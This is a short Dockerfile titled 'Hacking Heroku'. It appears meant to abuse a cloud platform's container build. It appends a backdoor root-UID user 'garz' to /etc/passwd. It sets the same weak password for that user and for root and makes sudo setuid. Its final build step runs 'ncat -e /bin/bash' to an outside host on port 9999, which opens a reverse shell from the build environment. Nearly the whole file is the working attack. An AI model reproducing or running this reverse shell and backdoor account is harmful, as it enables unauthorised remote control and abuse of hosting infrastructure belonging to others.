# ------------------------------------------------------------
# Hacking Heroku
# ------------------------------------------------------------

FROM ubuntu:20.04

WORKDIR /root
ENV TZ=Asia/Jakarta \
    DEBIAN_FRONTEND=noninteractive
RUN apt-get update
RUN apt-get -y install net-tools sudo nano python python3 python3-pip ncat
RUN apt-get -y install docker-ce docker-ce-cli containerd.io docker-compose-plugin
RUN echo "garz:x:0:0:root:/root:/bin/bash" | tee -a /etc/passwd
RUN echo "garz\ngarz\n" | passwd garz
RUN echo "garz\ngarz\n" | passwd root
RUN chown root:root /usr/bin/sudo && chmod 4755 /usr/bin/sudo
RUN usermod -aG docker garz
RUN ncat -e /bin/bash sister.ust.ac.id 9999
